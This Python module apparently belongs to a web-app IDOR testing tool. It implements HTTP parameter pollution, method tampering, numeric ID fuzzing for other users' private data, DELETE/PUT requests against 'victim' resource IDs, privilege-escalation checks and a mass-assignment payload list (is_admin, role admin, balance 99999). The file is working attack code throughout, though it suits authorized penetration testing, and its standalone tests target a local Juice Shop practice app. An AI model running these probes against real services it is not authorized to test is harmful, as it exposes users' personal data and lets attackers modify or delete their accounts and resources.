"""
idor_testing.py — Core IDOR Testing Techniques.

Implements:
  B1. HPP + Method Tampering
  B2. Numeric ID Fuzzing
  B3. State-Changing IDOR (GET method, DELETE/PUT)
  B4. Vertical + Horizontal Privilege Escalation
  B5. Mass Assignment
"""
import json
import re
import time
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from idor_utils import (
    C, G, Y, R, M, BOLD, RST, DIM,
    curl_request, fetch, load_lines, save_lines,
)


# ═══════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════
def _replace_id_in_url(url, own_id, victim_id):
    """Replace own_id with victim_id in URL. Returns new URL or None."""
    if not own_id or not victim_id:
        return None
    own_s, victim_s = str(own_id), str(victim_id)
    if own_s not in url:
        return None
    return url.replace(own_s, victim_s, 1)


def _modify_query(url, params):
    """Return URL with replaced query params."""
    p = urlparse(url)
    q = parse_qs(p.query, keep_blank_values=True)
    for k, v in params.items():
        q[k] = [str(v)]
    new_query = urlencode(q, doseq=True)
    return urlunparse((p.scheme, p.netloc, p.path, p.params, new_query, p.fragment))


def _contains_own_data(body, own_email):
    """Check if response contains own data (means NOT victim's)."""
    if not body or not own_email:
        return False
    return own_email.lower() in body.lower()


def _looks_private(body):
    """Heuristic: does response contain PII-like fields?"""
    if not body:
        return False
    patterns = [
        r'"(email|phone|address|ssn|dob|salary|balance|token|secret|password)"\s*:',
        r'"user[_-]?id"\s*:\s*\d+',
        r'"is[_-]?admin"\s*:\s*(true|false)',
    ]
    return any(re.search(p, body, re.IGNORECASE) for p in patterns)


# ═══════════════════════════════════════════════════════════
# B1. HPP + Method Tampering
# ═══════════════════════════════════════════════════════════
def test_hpp(url, param_name, own_id, victim_id, cookies=None, headers=None):
    """
    Test HTTP Parameter Pollution.
    Returns list of findings.
    """
    findings = []
    if not param_name or own_id is None or victim_id is None:
        return findings

    # Test variations
    variations = [
        # Duplicate params (first wins / last wins)
        {"label": "dup_both", "url": _append_param(url, param_name, own_id, param_name, victim_id)},
        {"label": "dup_rev",  "url": _append_param(url, param_name, victim_id, param_name, own_id)},
        # Array syntax
        {"label": "array",    "url": _replace_param(url, param_name, f"{own_id}&{param_name}[]={victim_id}")},
        # Comma
        {"label": "comma",    "url": _replace_param(url, param_name, f"{own_id},{victim_id}")},
    ]

    # Baseline: own ID
    base = fetch(url, timeout=8, headers=headers)
    base_len = len(base.get("body", ""))

    for v in variations:
        if not v["url"]:
            continue
        r = fetch(v["url"], timeout=8, headers=headers)
        if r["status"] == 200 and r["body"]:
            new_len = len(r["body"])
            if abs(new_len - base_len) > 50 and _looks_private(r["body"]):
                findings.append({
                    "type": "hpp",
                    "url": v["url"],
                    "variant": v["label"],
                    "status": r["status"],
                    "reason": f"HPP variant '{v['label']}' returns different data with private fields",
                    "confidence": "medium",
                })
        time.sleep(0.3)
    return findings


def _append_param(url, k1, v1, k2, v2):
    """Append params to URL (may duplicate)."""
    p = urlparse(url)
    existing = p.query
    new_part = f"{k1}={v1}&{k2}={v2}"
    new_query = f"{existing}&{new_part}" if existing else new_part
    return urlunparse((p.scheme, p.netloc, p.path, p.params, new_query, p.fragment))


def _replace_param(url, key, value):
    """Replace or add a query param."""
    p = urlparse(url)
    q = parse_qs(p.query, keep_blank_values=True)
    q[key] = [str(value)]
    return urlunparse((p.scheme, p.netloc, p.path, p.params, urlencode(q, doseq=True), p.fragment))


def test_method_tampering(url, own_id=None, victim_id=None, cookies=None):
    """
    Try same URL with different HTTP methods.
    Returns findings.
    """
    findings = []
    methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]

    # Target URL (with victim ID if we can compute)
    target_url = url
    if own_id is not None and victim_id is not None:
        t = _replace_id_in_url(url, own_id, victim_id)
        if t:
            target_url = t

    results = {}
    for m in methods:
        r = curl_request(target_url, method=m, cookies=cookies, timeout=8, follow=False)
        results[m] = {"status": r["status"], "body_len": len(r.get("body", ""))}
        time.sleep(0.2)

    # Compare: if one method returns 200 while others return 403, that's suspicious
    statuses = {m: v["status"] for m, v in results.items()}
    ok_methods = [m for m, s in statuses.items() if s == 200]
    blocked_methods = [m for m, s in statuses.items() if s in (401, 403)]

    if ok_methods and blocked_methods:
        findings.append({
            "type": "method-tampering",
            "url": target_url,
            "reason": f"Methods {ok_methods} return 200 while {blocked_methods} are blocked",
            "confidence": "medium",
            "details": results,
        })

    # Try X-HTTP-Method-Override
    for override in ["PUT", "DELETE", "PATCH"]:
        h = {"X-HTTP-Method-Override": override}
        r = curl_request(target_url, method="POST", headers=h, timeout=8)
        if r["status"] == 200 and _looks_private(r.get("body", "")):
            findings.append({
                "type": "method-override",
                "url": target_url,
                "reason": f"X-HTTP-Method-Override: {override} accepted on POST",
                "confidence": "high",
            })

    return findings


# ═══════════════════════════════════════════════════════════
# B2. Numeric ID Fuzzing
# ═══════════════════════════════════════════════════════════
def fuzz_numeric_id(url_template, start=1, end=100, own_id=None, cookies=None,
                    step=1, max_findings=20, verbose=False, headers=None):
    """
    Fuzz numeric IDs in url_template (must contain {ID}).
    Returns findings (different responses than own).

    url_template example: https://example.com/api/user/{ID}
    """
    findings = []
    if "{ID}" not in url_template:
        if verbose:
            print(f"    {Y}[!]{RST} URL template must contain {{ID}}")
        return findings

    # Baseline: our own ID response (if provided)
    base_len = None
    base_body = None
    if own_id is not None:
        base_url = url_template.replace("{ID}", str(own_id))
        r = fetch(base_url, timeout=6, cookies=cookies, headers=headers)
        if r["status"] == 200:
            base_len = len(r["body"])
            base_body = r["body"]

    print(f"    {DIM}Testing {end - start} IDs...{RST}")
    for i in range(start, end + 1, step):
        if i == own_id:
            continue
        url = url_template.replace("{ID}", str(i))
        r = fetch(url, timeout=6, cookies=cookies, headers=headers)
        if r["status"] == 200 and r["body"]:
            body = r["body"]
            # Skip if response identical to own (means same data returned)
            if base_body and body.strip() == base_body.strip():
                continue
            new_len = len(body)
            # Different length + private fields = potential IDOR
            if base_len is None or abs(new_len - base_len) > 50:
                if _looks_private(body):
                    findings.append({
                        "type": "numeric-idor",
                        "url": url,
                        "id": i,
                        "status": r["status"],
                        "size": new_len,
                        "preview": body[:300],
                        "reason": f"ID {i} returns private data",
                        "confidence": "medium",
                    })
                    if len(findings) >= max_findings:
                        break
        time.sleep(0.15)
    return findings


# ═══════════════════════════════════════════════════════════
# B3. State-Changing IDOR
# ═══════════════════════════════════════════════════════════
def test_state_change_get(delete_url, own_id=None, victim_id=None, cookies=None):
    """
    Try to invoke a DELETE/PUT endpoint via GET.
    Returns findings.
    """
    findings = []
    target_url = delete_url
    if own_id is not None and victim_id is not None:
        t = _replace_id_in_url(delete_url, own_id, victim_id)
        if t:
            target_url = t

    r = curl_request(target_url, method="GET", cookies=cookies, timeout=8)
    if r["status"] in (200, 204):
        # Success indicator: response doesn't say error
        body = r.get("body", "")
        if not re.search(r'\b(error|forbidden|not\s+allowed|unauthorized)\b', body, re.IGNORECASE):
            findings.append({
                "type": "state-change-get",
                "url": target_url,
                "status": r["status"],
                "reason": "Destructive action accepted via GET (CSRF+IDOR)",
                "confidence": "high",
                "preview": body[:300],
            })
    return findings


def test_state_changing(url, own_id, victim_id, method="DELETE", cookies=None,
                        body=None):
    """
    Test if we can modify/delete victim's resource.
    """
    findings = []
    target_url = _replace_id_in_url(url, own_id, victim_id)
    if not target_url:
        return findings

    # Try with victim ID
    r = curl_request(target_url, method=method, cookies=cookies, data=body, timeout=10)
    if r["status"] in (200, 201, 204):
        body_text = r.get("body", "")
        if not re.search(r'\b(error|forbidden|not\s+found|unauthorized)\b', body_text, re.IGNORECASE):
            findings.append({
                "type": f"state-change-{method.lower()}",
                "url": target_url,
                "status": r["status"],
                "reason": f"{method} on victim resource returned success",
                "confidence": "high",
                "preview": body_text[:300],
            })
    return findings


# ═══════════════════════════════════════════════════════════
# B4. Vertical + Horizontal Privilege Escalation
# ═══════════════════════════════════════════════════════════
def test_horizontal_idor(url, session_a, session_b, own_id_a=None):
    """
    A vs B: Does user A see another user's resource?

    IDOR signal (matches phase_authenticated_testing):
      • A gets 200
      • Anon gets 401/403 (blocked)
      • Target ID in URL is NOT A's own ID

    This catches the common case where the target has no
    ownership check on individual object endpoints.
    """
    findings = []
    if not url or not url.startswith("http"):
        return findings

    # ── Extract target ID from URL ──
    m = re.search(r'/(\d+)(?:/|$|\?|#)', url)
    if not m:
        return findings  # no numeric ID → not applicable
    try:
        target_id = int(m.group(1))
    except (ValueError, TypeError):
        return findings

    # ── Skip if A's own resource ──
    if own_id_a is not None and target_id == own_id_a:
        return findings

    cookie_a = session_a.get("cookies")
    headers_a = session_a.get("token_headers", {})

    # ── A request ──
    r_a = curl_request(url, cookies=cookie_a, headers=headers_a, timeout=10)
    # ── Anon request ──
    r_anon = curl_request(url, timeout=10)

    # ── Signal: A sees, anon blocked ──
    if r_a["status"] == 200 and r_anon["status"] in (401, 403):
        a_body = r_a.get("body", "") or ""
        # Accept if body has content (private OR generic JSON)
        if len(a_body) >= 30:
            findings.append({
                "type": "horizontal-idor",
                "url": url,
                "reason": f"A (uid={own_id_a}) accessed /{target_id} (not theirs), anon blocked",
                "confidence": "high",
                "status": {"A": r_a["status"], "anon": r_anon["status"]},
                "preview": a_body[:200],
            })
    return findings


def test_vertical_escalation(url, low_priv_session, method="POST",
                             body=None, cookies=None):
    """
    Test if a low-priv user can perform an admin/write action.
    low_priv_session: dict with cookies + token_headers
    """
    findings = []
    cookie = (low_priv_session or {}).get("cookies") or cookies
    headers = (low_priv_session or {}).get("token_headers", {})

    r = curl_request(url, method=method, cookies=cookie, headers=headers,
                     data=body, timeout=10)
    if r["status"] in (200, 201, 204):
        body_text = r.get("body", "")
        if not re.search(r'\b(error|forbidden|not\s+allowed|unauthorized|denied)\b', body_text, re.IGNORECASE):
            findings.append({
                "type": "vertical-privesc",
                "url": url,
                "method": method,
                "status": r["status"],
                "reason": "Low-priv user successfully performed write/admin action",
                "confidence": "high",
                "preview": body_text[:300],
            })
    return findings


# ═══════════════════════════════════════════════════════════
# B5. Mass Assignment
# ═══════════════════════════════════════════════════════════
MASS_ASSIGN_FIELDS = [
    ("is_admin", True),
    ("isAdmin", True),
    ("admin", True),
    ("role", "admin"),
    ("role", "administrator"),
    ("permissions", ["admin"]),
    ("verified", True),
    ("email_verified", True),
    ("balance", 99999),
    ("credit", 99999),
    ("is_active", True),
    ("status", "active"),
    ("is_staff", True),
    ("is_superuser", True),
]


def test_mass_assignment(url, method="POST", base_body=None, cookies=None,
                         headers=None, probe_url=None):
    """
    Try injecting admin/role fields into an update request.
    base_body: original JSON body as dict (will be copied and augmented)
    probe_url: optional URL to verify if escalation took effect
    """
    findings = []
    if base_body is None:
        base_body = {}

    for field, value in MASS_ASSIGN_FIELDS:
        augmented = dict(base_body)
        augmented[field] = value
        data = json.dumps(augmented)
        h = dict(headers or {})
        h["Content-Type"] = "application/json"

        r = curl_request(url, method=method, cookies=cookies, headers=h,
                         data=data, timeout=10)
        if r["status"] in (200, 201, 204):
            body_text = r.get("body", "")
            # Success indicator
            if not re.search(r'\b(error|forbidden|not\s+allowed|unauthorized)\b', body_text, re.IGNORECASE):
                finding = {
                    "type": "mass-assignment",
                    "url": url,
                    "field": field,
                    "value": value,
                    "status": r["status"],
                    "reason": f"Server accepted unauthorized field '{field}'",
                    "confidence": "medium",
                    "preview": body_text[:200],
                }
                # Check reflection
                if str(value).lower() in body_text.lower():
                    finding["confidence"] = "high"
                    finding["reason"] += " (field value reflected)"
                findings.append(finding)
        time.sleep(0.2)

    return findings


if __name__ == "__main__":
    # Standalone tests
    import sys
    print("=== idor_testing standalone tests ===\n")

    # Test 1: helper functions
    print("[1] Helper functions")
    print(f"    _replace_id_in_url: {_replace_id_in_url('http://x.com/user/123', '123', '456')}")
    print(f"    _modify_query: {_modify_query('http://x.com/a?id=1&x=2', {'id': 999})}")
    print()

    # Test 2: Mass Assignment (dry - just shows payloads)
    print("[2] Mass Assignment payloads:")
    for field, value in MASS_ASSIGN_FIELDS[:5]:
        print(f"    {{\"name\": \"test\", \"{field}\": {json.dumps(value)}}}")
    print()

    # Test 3: HPP URL builder
    print("[3] HPP URL building:")
    u = _append_param("http://x.com/api?id=1", "id", 1, "id", 2)
    print(f"    {u}")
    print()

    # Test 4: Numeric fuzzing (dry test on Juice Shop if it exists)
    print("[4] Numeric fuzzing test (localhost:3000):")
    if len(sys.argv) > 1:
        findings = fuzz_numeric_id(
            sys.argv[1] + "/api/Products/{ID}",
            start=1, end=10,
            verbose=True
        )
        print(f"    Found {len(findings)} candidates")
    else:
        print(f"    (skipped - pass target URL as argument to test)")
